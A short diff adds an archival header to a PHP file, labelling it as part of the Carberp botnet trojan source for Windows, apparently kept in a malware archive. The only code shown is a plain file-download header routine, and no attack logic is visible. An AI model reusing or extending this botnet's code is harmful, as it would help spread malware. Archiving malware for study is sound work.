@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       —
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     —
+ */
 
 if(file_exists($file_name)){
 	header( "Content-Disposition: attachment; filename=\"" . basename($file_name) . '"' );
